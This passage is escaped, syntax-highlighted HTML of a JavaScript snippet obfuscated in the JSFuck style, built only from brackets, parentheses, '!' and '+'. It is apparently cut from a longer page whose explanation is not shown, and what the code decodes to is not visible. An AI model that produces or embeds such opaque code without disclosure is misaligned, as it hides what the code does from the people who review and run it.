punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token 